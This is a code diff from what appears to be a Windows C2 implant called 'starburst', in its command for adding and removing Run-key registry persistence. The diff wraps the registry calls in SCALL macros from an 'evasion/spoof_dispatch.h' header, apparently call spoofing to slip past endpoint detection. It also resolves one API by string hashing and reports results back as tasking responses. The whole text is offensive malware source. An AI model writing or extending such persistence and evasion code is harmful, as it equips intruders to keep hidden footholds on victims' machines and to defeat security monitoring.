@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PERSIST_RUN
 
@@ -56,7 +57,7 @@ auto declfn starburst::cmd_persist_run(
         }
 
         HKEY h_key = nullptr;
-        LSTATUS status = inst.advapi32.RegOpenKeyExA(
+        LSTATUS status = (LSTATUS)SCALL( inst, advapi32.RegOpenKeyExA,
             hive, run_key, 0, KEY_SET_VALUE, &h_key );
         if ( status != ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -65,10 +66,10 @@ auto declfn starburst::cmd_persist_run(
         }
 
         uint32_t cmd_total_len = str_len( command_buf ) + 1;
-        status = inst.advapi32.RegSetValueExA(
+        status = (LSTATUS)SCALL( inst, advapi32.RegSetValueExA,
             h_key, name_buf, 0, REG_SZ,
             reinterpret_cast<const BYTE*>( command_buf ), cmd_total_len );
-        inst.advapi32.RegCloseKey( h_key );
+        SCALL( inst, advapi32.RegCloseKey, h_key );
 
         if ( status == ERROR_SUCCESS ) {
             char out[320] = { 0 };
@@ -84,7 +85,7 @@ auto declfn starburst::cmd_persist_run(
     } else {
         // remove
         HKEY h_key = nullptr;
-        LSTATUS status = inst.advapi32.RegOpenKeyExA(
+        LSTATUS status = (LSTATUS)SCALL( inst, advapi32.RegOpenKeyExA,
             hive, run_key, 0, KEY_SET_VALUE, &h_key );
         if ( status != ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -97,14 +98,14 @@ auto declfn starburst::cmd_persist_run(
                 reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
                 expr::hash_string( "RegDeleteValueA" ) ) );
         if ( !pRegDeleteValueA ) {
-            inst.advapi32.RegCloseKey( h_key );
+            SCALL( inst, advapi32.RegCloseKey, h_key );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "RegDeleteValueA not found" ) ) );
             return;
         }
 
-        status = pRegDeleteValueA( h_key, name_buf );
-        inst.advapi32.RegCloseKey( h_key );
+        status = (LSTATUS)SCALL_PTR( inst, pRegDeleteValueA, h_key, name_buf );
+        SCALL( inst, advapi32.RegCloseKey, h_key );
 
         if ( status == ERROR_SUCCESS ) {
             char out[320] = { 0 };
